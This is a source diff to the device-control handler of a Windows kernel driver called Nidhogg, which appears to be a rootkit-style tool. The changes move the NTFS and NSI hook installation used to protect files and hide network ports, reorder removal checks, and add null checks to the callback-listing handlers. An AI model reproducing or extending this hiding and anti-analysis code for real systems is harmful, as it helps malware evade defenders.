@@ -430,16 +430,6 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 					break;
 				}
 
-				if (!NidhoggFileUtils->IsCallbackActivated(0)) {
-					status = NidhoggFileUtils->InstallNtfsHook(IRP_MJ_CREATE);
-
-					if (!NT_SUCCESS(status)) {
-						NidhoggFileUtils->RemoveFile(protectedFile.FilePath);
-						Print(DRIVER_PREFIX "Failed to hook ntfs.\n");
-						break;
-					}
-				}
-
 				auto prevIrql = KeGetCurrentIrql();
 				KeLowerIrql(PASSIVE_LEVEL);
 				Print(DRIVER_PREFIX "Protecting file %ws.\n", protectedFile.FilePath);
@@ -447,16 +437,14 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			}
 		}
 		else {
-			if (!NidhoggFileUtils->RemoveFile(protectedFile.FilePath)) {
+			if (NidhoggFileUtils->GetFilesCount() == 0) {
 				status = STATUS_NOT_FOUND;
 				break;
 			}
 
-			if (NidhoggFileUtils->GetFilesCount() == 0) {
-				status = NidhoggFileUtils->UninstallNtfsHook(IRP_MJ_CREATE);
-
-				if (!NT_SUCCESS(status))
-					Print(DRIVER_PREFIX "Failed to restore the hook.\n");
+			if (!NidhoggFileUtils->RemoveFile(protectedFile.FilePath)) {
+				status = STATUS_NOT_FOUND;
+				break;
 			}
 
 			auto prevIrql = KeGetCurrentIrql();
@@ -706,11 +694,13 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			break;
 		}
 
-		if (!NT_SUCCESS(status) || itemsCount == 0 || data->RegItemsIndex > itemsCount) {
+		if (!NT_SUCCESS(status) || data->RegItemsIndex > itemsCount) {
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
-		status = NidhoggRegistryUtils->QueryRegItem(data);
+
+		if (itemsCount > 0)
+			status = NidhoggRegistryUtils->QueryRegItem(data);
 
 		len += sizeof(RegItem);
 		break;
@@ -1075,6 +1065,11 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 		auto data = (PsRoutinesList*)Irp->AssociatedIrp.SystemBuffer;
 
+		if (!data->Routines) {
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
 		switch (data->Type) {
 		case PsImageLoadType:
 		case PsCreateProcessTypeEx:
@@ -1101,6 +1096,12 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		}
 
 		auto data = (CmCallbacksList*)Irp->AssociatedIrp.SystemBuffer;
+
+		if (!data->Callbacks) {
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
 		status = NidhoggAntiAnalysis->ListRegistryCallbacks(data, NULL, NULL);
 
 		len += sizeof(CmCallbacksList);
@@ -1274,16 +1275,6 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 					break;
 				}
 
-				if (!NidhoggNetworkUtils->IsCallbackActivated()) {
-					status = NidhoggNetworkUtils->InstallNsiHook();
-
-					if (!NT_SUCCESS(status)) {
-						NidhoggNetworkUtils->RemoveHiddenPort(hiddenPort);
-						Print(DRIVER_PREFIX "Failed to hook nsi.\n");
-						break;
-					}
-				}
-
 				auto prevIrql = KeGetCurrentIrql();
 				KeLowerIrql(PASSIVE_LEVEL);
 				Print(DRIVER_PREFIX "Hid port %d.\n", hiddenPort.Port);
@@ -1291,16 +1282,14 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			}
 		}
 		else {
-			if (!NidhoggNetworkUtils->RemoveHiddenPort(hiddenPort)) {
+			if (NidhoggNetworkUtils->GetPortsCount() == 0) {
 				status = STATUS_NOT_FOUND;
 				break;
 			}
 
-			if (NidhoggNetworkUtils->GetPortsCount() == 0) {
-				status = NidhoggNetworkUtils->UninstallNsiHook();
-
-				if (!NT_SUCCESS(status))
-					Print(DRIVER_PREFIX "Failed to restore the hook.\n");
+			if (!NidhoggNetworkUtils->RemoveHiddenPort(hiddenPort)) {
+				status = STATUS_NOT_FOUND;
+				break;
 			}
 
 			auto prevIrql = KeGetCurrentIrql();
